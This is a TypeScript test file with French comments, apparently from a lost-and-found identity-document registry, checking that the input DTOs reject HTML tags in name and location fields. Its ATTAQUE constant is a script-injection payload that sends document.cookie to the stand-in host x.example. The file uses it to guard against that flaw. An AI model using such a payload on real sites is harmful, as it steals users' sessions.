import { describe, expect, it } from 'vitest';
import { plainToInstance } from 'class-transformer';
import { validate } from 'class-validator';
import { CreatePieceTrouveeDto } from '../pieces-trouvees/dto/create-piece-trouvee.dto';
import { CreateAlertePerteDto } from '../alertes-perte/dto/create-alerte-perte.dto';
import { MESSAGE_SANS_BALISE } from './texte';

/**
 * Une commune « </script><script>… » envoyée sans compte finissait recopiée
 * dans le <head> de toutes les pages du registre. La vraie correction est a
 * la sortie (jsonPourScript dans le Worker) ; ces cas figent la seconde
 * ligne de defense, a l'entree.
 */

const ATTAQUE = "</script><script>fetch('//x.example/?'+document.cookie)</script>";

const piece = (surcharge: Record<string, unknown>) =>
  plainToInstance(CreatePieceTrouveeDto, {
    declarant: { telephone: '0700000000', prenom: 'Awa', nom: 'Koné' },
    typePiece: 'CNI',
    prenom: 'Adjoua',
    nom: 'N’Guessan',
    commune: 'Yopougon',
    lat: 5.34,
    lng: -4.07,
    ...surcharge,
  });

const messages = async (objet: object) =>
  (await validate(objet)).flatMap((e) => [
    ...Object.values(e.constraints ?? {}),
    ...(e.children ?? []).flatMap((c) => Object.values(c.constraints ?? {})),
  ]);

describe('SansBalise', () => {
  it('refuse l’attaque exacte relevée par la relecture, dans la commune', async () => {
    expect(await messages(piece({ commune: ATTAQUE }))).toContain(MESSAGE_SANS_BALISE);
  });

  it('protège chaque champ de texte libre d’une pièce trouvée', async () => {
    for (const champ of ['prenom', 'nom', 'commune', 'quartier', 'pointDepotAutre']) {
      expect(await messages(piece({ [champ]: '<b>x</b>' })), champ).toContain(MESSAGE_SANS_BALISE);
    }
  });

  it('protège aussi l’identité du déclarant', async () => {
    const m = await messages(
      piece({ declarant: { telephone: '0700000000', prenom: '<img>', nom: 'Koné' } }),
    );
    expect(m).toContain(MESSAGE_SANS_BALISE);
  });

  it('protège une alerte de perte', async () => {
    const alerte = plainToInstance(CreateAlertePerteDto, {
      utilisateur: { telephone: '0700000000', prenom: 'Awa', nom: 'Koné' },
      typePiece: 'CNI',
      prenom: 'Awa',
      nom: 'Koné',
      quartier: ATTAQUE,
    });
    expect(await messages(alerte)).toContain(MESSAGE_SANS_BALISE);
  });

  it('laisse passer les vrais noms et lieux, apostrophes et accents compris', async () => {
    const reel = piece({
      nom: 'N’Guessan',
      commune: 'Port-Bouët',
      quartier: 'Carrefour de la Vie, près de l’église',
      pointDepotAutre: 'Pharmacie Saint-Jean (comptoir)',
    });
    expect(await messages(reel)).not.toContain(MESSAGE_SANS_BALISE);
  });
});
